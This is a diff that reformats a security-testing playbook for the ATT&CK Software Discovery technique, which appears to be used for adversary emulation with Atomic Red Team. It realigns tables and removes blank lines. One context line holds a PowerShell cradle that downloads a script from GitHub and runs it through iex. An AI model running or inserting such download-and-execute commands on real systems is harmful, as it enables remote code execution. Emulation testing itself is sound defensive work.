@@ -36,8 +36,7 @@ cwe_ids:
 chains_with:
   - T1518.001
   - T1518.002
-prerequisites:
-  []
+prerequisites: []
 severity_boost:
   T1518.001: "Chain with T1518.001 for deeper attack path"
   T1518.002: "Chain with T1518.002 for deeper attack path"
@@ -129,7 +128,6 @@ iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/
 dotnet -consoleoutput -noninteractive
 ```
 
-
 ### Manual Testing
 
 If Atomic Red Team tests are not applicable, manually verify the technique by:
@@ -148,19 +146,17 @@ No specific mitigations documented for this technique.
 
 ### Multi-Platform Software Discovery Behavior Chain
 
-
 ## Risk Assessment
 
-| Finding | Severity | Impact |
-| ------- | -------- | ------ |
-| Software Discovery technique applicable | High | Discovery |
+| Finding                                 | Severity | Impact    |
+| --------------------------------------- | -------- | --------- |
+| Software Discovery technique applicable | High     | Discovery |
 
 ## CWE Categories
 
-| CWE ID | Title |
-| ------ | ----- |
+| CWE ID  | Title                             |
+| ------- | --------------------------------- |
 | CWE-200 | Exposure of Sensitive Information |
-
 
 ## References
 
